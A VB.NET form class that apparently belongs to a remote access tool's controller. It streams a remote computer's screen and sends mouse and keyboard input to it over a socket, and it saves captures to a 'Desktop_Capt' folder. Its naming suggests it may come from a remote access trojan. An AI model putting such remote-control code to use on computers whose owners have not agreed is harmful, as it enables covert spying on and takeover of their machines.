Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class sc

    Public co As Integer = 0
    Public Folder As String = ""
    Private NP As New Point
    Private op As New Point
    Public osk As Client
    Public QQ As String
    Public sk As Client
    Public sz As Size

    Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If (Not Me.sk Is Nothing) Then
            Me.sk.CN = False
        End If
    End Sub

    Private Sub sc_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim p As PictureBox = Me.P
            SyncLock p
                Me.QQ = Conversions.ToString(ind.vno(Me.osk.L))
                Me.Text = Me.QQ
                Dim control As Control = Me.P
                Dim q As Integer = 0
                Do
                    Dim size As Size = Me.QZ(q)
                    Me.ComboBox1.Items.Add((Conversions.ToString(size.Width) & "," & Conversions.ToString(size.Height)))
                    q += 1
                Loop While (q <= 13)
                AddHandler control.KeyUp, New KeyEventHandler(AddressOf Me.KUP)
                AddHandler control.KeyDown, New KeyEventHandler(AddressOf Me.KDW)
                Me.ComboBox1.SelectedIndex = 0
            End SyncLock
            Me.Folder = (Me.osk.Folder & "Desktop_Capt\")
            If Not Directory.Exists(Me.Folder) Then
                Directory.CreateDirectory(Me.Folder)
            End If
            Me.Button1_Click(RuntimeHelpers.GetObjectValue(sender), e)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Stop") Then
            Me.Button1.Text = "Start"
            Me.sk.Send("!!")
            Me.ComboBox1.Enabled = True
        Else
            Me.ComboBox1.Enabled = False
            Me.Button1.Text = "Stop"
            Me.sk.Send(String.Concat(New String() {"!", ind.Y, Me.sk.ip, ind.Y, Strings.Split(Me.ComboBox1.Text, ",", -1, CompareMethod.Binary)(0), ind.Y, Strings.Split(Me.ComboBox1.Text, ",", -1, CompareMethod.Binary)(1), ind.Y, Conversions.ToString(0)}))
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.CheckBox1.Checked And (Me.Button1.Text <> "Start")) AndAlso (Me.NP <> Me.op)) Then
            Me.op = Me.NP
            Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(Me.op.X), ind.Y, Conversions.ToString(Me.op.Y), ind.Y, Conversions.ToString(1)}))
        End If
        If (Not Me.osk.CN Or Not Me.sk.CN) Then
            Me.sk.CN = False
            Me.Panel1.Enabled = False
            Me.Text = ("Disconnected!! " & Me.QQ)
        End If
    End Sub

    Private Sub sc_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
        If (e.Y < 20) Then
            Me.Panel1.BringToFront()
        Else
            Me.Panel1.SendToBack()
            Dim p As PictureBox = Me.P
            SyncLock p
                If ((Not Me.P.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked) Then
                    Me.P.Focus()
                End If
            End SyncLock
        End If
        Me.NP = New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.sz.Width) / CDbl(Me.P.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.sz.Height) / CDbl(Me.P.Height)))))))
    End Sub

    Private Sub sc_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim p As PictureBox = Me.P
        SyncLock p
            Me.Panel1.Left = (CInt(Math.Round(CDbl((CDbl(Me.Width) / 2)))) - CInt(Math.Round(CDbl((CDbl(Me.Panel1.Width) / 2)))))
        End SyncLock
    End Sub

    Private Sub sc_ResizeBegin(sender As Object, e As EventArgs) Handles Me.ResizeBegin
        Dim p As PictureBox = Me.P
        SyncLock p
        End SyncLock
    End Sub

    Private Sub sc_ResizeEnd(sender As Object, e As EventArgs) Handles Me.ResizeEnd
        Dim p As PictureBox = Me.P
        SyncLock p
        End SyncLock
    End Sub

    Public Function QZ(ByVal q As Integer) As Size
        Dim size2 As New Size(sz)
        Select Case q
            Case 0
                Return Me.sz
            Case 1
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.1))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.1))))
                Exit Select
            Case 2
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.3))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.3))))
                Exit Select
            Case 3
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.5))))
                Exit Select
            Case 4
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.9))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.9))))
                Exit Select
            Case 5
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2))))
                Exit Select
            Case 6
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.1))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.1))))
                Exit Select
            Case 7
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.2))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.2))))
                Exit Select
            Case 8
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.5))))
                Exit Select
            Case 9
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 3))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 3))))
                Exit Select
            Case 10
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 3.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 3.5))))
                Exit Select
            Case 11
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 4))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 4))))
                Exit Select
            Case 12
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 5))))
                Exit Select
            Case 13
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 6))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 6))))
                Exit Select
            Case 14
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 6.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 6.5))))
                Exit Select
        End Select
        size2.Width = Conversions.ToInteger((Strings.Mid(size2.Width.ToString, 1, (size2.Width.ToString.Length - 1)) & Conversions.ToString(0)))
        size2.Height = Conversions.ToInteger((Strings.Mid(size2.Height.ToString, 1, (size2.Height.ToString.Length - 1)) & Conversions.ToString(0)))
        Return size2
    End Function

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If Me.CheckBox3.Checked Then
            Try
                Process.Start(Me.Folder)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Public Sub KDW(ByVal s As Object, ByVal e As KeyEventArgs)
        If (Me.Button1.Text <> "Start") Then
            Me.P.Focus()
            If Me.CheckBox2.Checked Then
                Select Case e.KeyCode
                    Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
                        Me.sk.Send(String.Concat(New String() {"#", ind.Y, Conversions.ToString(0), ind.Y, Conversions.ToString(&H10)}))
                        Return
                End Select
                Me.sk.Send(String.Concat(New String() {"#", ind.Y, Conversions.ToString(0), ind.Y, Conversions.ToString(CInt(e.KeyCode))}))
            End If
        End If
    End Sub

    Public Sub KUP(ByVal s As Object, ByVal e As KeyEventArgs)
        If (Me.Button1.Text <> "Start") Then
            Me.P.Focus()
            If Me.CheckBox2.Checked Then
                Select Case e.KeyCode
                    Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
                        Me.sk.Send(String.Concat(New String() {"#", ind.Y, Conversions.ToString(2), ind.Y, Conversions.ToString(&H10)}))
                        Return
                End Select
                Me.sk.Send(String.Concat(New String() {"#", ind.Y, Conversions.ToString(2), ind.Y, Conversions.ToString(CInt(e.KeyCode))}))
            End If
        End If
    End Sub

    Private Sub P_Click(ByVal sender As Object, ByVal e As EventArgs)
    End Sub

    Private Sub P_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs)
        Dim p As PictureBox = Me.P
        SyncLock p
            If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
                Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(e.Delta), ind.Y, Conversions.ToString(Me.op.Y), ind.Y, Conversions.ToString(&H800)}))
            End If
        End SyncLock
    End Sub

    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs)
        Dim p As PictureBox = Me.P
        SyncLock p
            If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
                Dim num As Integer
                Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.sz.Width) / CDbl(Me.P.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.sz.Height) / CDbl(Me.P.Height)))))))
                If (e.Button = MouseButtons.Left) Then
                    num = 2
                End If
                If (e.Button = MouseButtons.Right) Then
                    num = 8
                End If
                Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(point.X), ind.Y, Conversions.ToString(point.Y), ind.Y, Conversions.ToString(num)}))
            End If
        End SyncLock
    End Sub

    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs)
        If (Me.CheckBox1.Checked AndAlso (Me.Button1.Text <> "Start")) Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.sz.Width) / CDbl(Me.P.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.sz.Height) / CDbl(Me.P.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 4
            End If
            If (e.Button = MouseButtons.Right) Then
                num = &H10
            End If
            Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(point.X), ind.Y, Conversions.ToString(point.Y), ind.Y, Conversions.ToString(num)}))
        End If
    End Sub

End Class